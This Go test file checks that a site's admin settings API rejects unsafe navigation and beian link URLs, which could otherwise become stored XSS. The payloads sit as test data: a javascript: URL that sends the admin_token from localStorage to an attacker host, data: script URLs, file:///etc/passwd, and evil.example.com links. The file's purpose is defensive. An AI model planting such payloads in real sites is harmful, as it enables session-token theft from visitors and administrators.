package http_test

import (
	"net/http"
	"strings"
	"testing"

	"xiaoheiplay/internal/domain"
	"xiaoheiplay/internal/testutil"
	"xiaoheiplay/internal/testutilhttp"
)

// web_url_content F1：站点设置里的 URL 字段（site_nav_items / beian_info_list）
// 会渲染进公共站点的 `<a href>` / `<img src>`。允许 `javascript:`/`data:`/
// 协议相对会被任何访客以同源身份执行（存储型 XSS），必须服务端 fail-closed。
func TestHandlers_AdminSettingsUpdate_RejectsUnsafeSiteNavUrl(t *testing.T) {
	cases := []struct {
		name  string
		value string
	}{
		{"javascript", `[{"label":"帮助","url":"javascript:fetch('//attacker/x?'+localStorage.getItem('admin_token'))"}]`},
		{"javascript-mixed-case", `[{"label":"帮助","url":"JaVaScRiPt:alert(1)"}]`},
		{"data", `[{"label":"帮助","url":"data:text/html,<script>x</script>"}]`},
		{"protocol-relative", `[{"label":"帮助","url":"//evil.example.com/steal"}]`},
		{"userinfo", `[{"label":"帮助","url":"https://user:pass@evil.example.com/"}]`},
		{"file", `[{"label":"帮助","url":"file:///etc/passwd"}]`},
		{"control-char", "[{\"label\":\"\xe5\xb8\xae\xe5\x8a\xa9\",\"url\":\"https://evil.example.com/\\u0000x\"}]"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := testutilhttp.NewTestEnv(t, false)
			token := issueSettingsAdminToken(t, env)
			rec := testutil.DoJSON(t, env.Router, http.MethodPatch, "/admin/api/v1/settings", map[string]any{
				"key":   "site_nav_items",
				"value": tc.value,
			}, token)
			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for %s, got %d: %s", tc.name, rec.Code, rec.Body.String())
			}
			if !strings.Contains(rec.Body.String(), domain.ErrUnsafeExternalURL.Error()) {
				t.Fatalf("expected error containing %q, got %s", domain.ErrUnsafeExternalURL.Error(), rec.Body.String())
			}
		})
	}
}

func TestHandlers_AdminSettingsUpdate_AcceptsSafeSiteNavUrls(t *testing.T) {
	cases := []struct {
		name  string
		value string
	}{
		{"same-origin-relative", `[{"label":"帮助","url":"/docs"}]`},
		{"https", `[{"label":"帮助","url":"https://example.com/docs"}]`},
		{"http", `[{"label":"帮助","url":"http://example.com/docs"}]`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := testutilhttp.NewTestEnv(t, false)
			token := issueSettingsAdminToken(t, env)
			rec := testutil.DoJSON(t, env.Router, http.MethodPatch, "/admin/api/v1/settings", map[string]any{
				"key":   "site_nav_items",
				"value": tc.value,
			}, token)
			if rec.Code != http.StatusOK {
				t.Fatalf("expected 200 for %s, got %d: %s", tc.name, rec.Code, rec.Body.String())
			}
		})
	}
}

func TestHandlers_AdminSettingsUpdate_RejectsUnsafeBeianLinkUrl(t *testing.T) {
	env := testutilhttp.NewTestEnv(t, false)
	token := issueSettingsAdminToken(t, env)
	rec := testutil.DoJSON(t, env.Router, http.MethodPatch, "/admin/api/v1/settings", map[string]any{
		"key":   "beian_info_list",
		"value": `[{"number":"京ICP备00000000号","link_url":"javascript:alert(1)"}]`,
	}, token)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for javascript beian link_url, got %d: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), domain.ErrUnsafeExternalURL.Error()) {
		t.Fatalf("expected error containing %q, got %s", domain.ErrUnsafeExternalURL.Error(), rec.Body.String())
	}
}

func TestHandlers_AdminSettingsUpdate_RejectsUnsafeBeianIconUrl(t *testing.T) {
	env := testutilhttp.NewTestEnv(t, false)
	token := issueSettingsAdminToken(t, env)
	rec := testutil.DoJSON(t, env.Router, http.MethodPatch, "/admin/api/v1/settings", map[string]any{
		"key":   "beian_info_list",
		"value": `[{"number":"京ICP备00000000号","icon_url":"javascript:alert(1)"}]`,
	}, token)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for javascript beian icon_url, got %d: %s", rec.Code, rec.Body.String())
	}
}
